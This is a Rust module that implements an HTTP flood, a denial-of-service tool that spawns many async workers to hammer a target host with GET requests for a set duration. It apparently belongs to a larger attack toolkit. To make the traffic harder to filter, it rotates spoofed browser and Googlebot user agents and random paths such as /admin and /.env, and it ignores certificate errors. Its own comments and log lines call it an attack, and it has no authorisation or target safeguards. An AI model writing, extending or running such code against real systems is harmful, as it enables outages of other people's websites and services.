use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use reqwest::Client;

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
];

const RANDOM_PATHS: &[&str] = &[
    "/", "/index.html", "/home", "/login", "/search", "/api/data",
    "/api/users", "/products", "/about", "/contact", "/dashboard",
    "/admin", "/wp-admin", "/wp-login.php", "/sitemap.xml",
    "/robots.txt", "/.env", "/config", "/api/v1/health",
    "/api/v2/status", "/graphql", "/rest/api/latest",
];

pub struct HttpFlood {
    target: String,
    duration: u64,
    threads: u32,
    port: u16,
    stop_flag: Arc<AtomicBool>,
    requests_sent: Arc<AtomicU64>,
    failed_requests: Arc<AtomicU64>,
    callback: Arc<dyn Fn(&str) + Send + Sync>,
}

impl HttpFlood {
    pub fn new(
        target: String,
        duration: u64,
        threads: u32,
        port: u16,
        callback: Arc<dyn Fn(&str) + Send + Sync>,
    ) -> Self {
        Self {
            target,
            duration,
            threads,
            port,
            stop_flag: Arc::new(AtomicBool::new(false)),
            requests_sent: Arc::new(AtomicU64::new(0)),
            failed_requests: Arc::new(AtomicU64::new(0)),
            callback,
        }
    }

    pub fn stop(&self) {
        self.stop_flag.store(true, Ordering::SeqCst);
    }

    /// Run the HTTP flood attack. Blocks until duration expires or stop() is called.
    /// Returns stats as a HashMap.
    pub fn run(&self) -> HashMap<String, String> {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .worker_threads(self.threads.min(64) as usize)
            .enable_all()
            .build()
            .expect("Failed to build tokio runtime");

        let result = rt.block_on(self.run_async());
        result
    }

    async fn run_async(&self) -> HashMap<String, String> {
        let scheme = if self.port == 443 { "https" } else { "http" };
        let base_url = if self.port == 80 || self.port == 443 {
            format!("{}://{}", scheme, self.target)
        } else {
            format!("{}://{}:{}", scheme, self.target, self.port)
        };

        (self.callback)(&format!(
            "[*] Launching HTTP Flood on {} with {} workers for {}s",
            base_url, self.threads, self.duration
        ));

        let start = Instant::now();
        let dur = Duration::from_secs(self.duration);
        let mut handles = Vec::new();

        for _ in 0..self.threads {
            let stop = self.stop_flag.clone();
            let sent = self.requests_sent.clone();
            let failed = self.failed_requests.clone();
            let url = base_url.clone();
            let cb = self.callback.clone();

            let handle = tokio::spawn(async move {
                let client = Client::builder()
                    .timeout(Duration::from_secs(5))
                    .danger_accept_invalid_certs(true)
                    .build()
                    .unwrap_or_default();

                let mut rng = StdRng::from_entropy();

                while !stop.load(Ordering::Relaxed) && start.elapsed() < dur {
                    let path = RANDOM_PATHS[rng.gen_range(0..RANDOM_PATHS.len())];
                    let ua = USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())];
                    let full_url = format!("{}{}", url, path);

                    match client
                        .get(&full_url)
                        .header("User-Agent", ua)
                        .header("Accept", "text/html,application/json,*/*")
                        .header("Accept-Language", "en-US,en;q=0.9")
                        .header("Cache-Control", "no-cache")
                        .send()
                        .await
                    {
                        Ok(_) => {
                            sent.fetch_add(1, Ordering::Relaxed);
                        }
                        Err(_) => {
                            failed.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }

                let _ = cb; // prevent drop warning
            });
            handles.push(handle);
        }

        // Stats reporting loop
        let stop_stats = self.stop_flag.clone();
        let sent_stats = self.requests_sent.clone();
        let failed_stats = self.failed_requests.clone();
        let cb_stats = self.callback.clone();

        let stats_handle = tokio::spawn(async move {
            loop {
                tokio::time::sleep(Duration::from_secs(1)).await;
                if stop_stats.load(Ordering::Relaxed) || start.elapsed() >= dur {
                    break;
                }
                let s = sent_stats.load(Ordering::Relaxed);
                let f = failed_stats.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();
                let rps = if elapsed > 0 { s / elapsed } else { s };
                cb_stats(&format!(
                    "[STATS] Sent: {} | Failed: {} | RPS: {} | Elapsed: {}s",
                    s, f, rps, elapsed
                ));
            }
        });

        for h in handles {
            let _ = h.await;
        }
        self.stop_flag.store(true, Ordering::SeqCst);
        let _ = stats_handle.await;

        let total_sent = self.requests_sent.load(Ordering::Relaxed);
        let total_failed = self.failed_requests.load(Ordering::Relaxed);
        let elapsed = start.elapsed().as_secs_f64();

        let mut stats = HashMap::new();
        stats.insert("requests_sent".into(), total_sent.to_string());
        stats.insert("failed_requests".into(), total_failed.to_string());
        stats.insert("duration".into(), format!("{:.1}s", elapsed));
        stats.insert(
            "rps".into(),
            format!("{:.0}", total_sent as f64 / elapsed.max(1.0)),
        );
        stats
    }
}
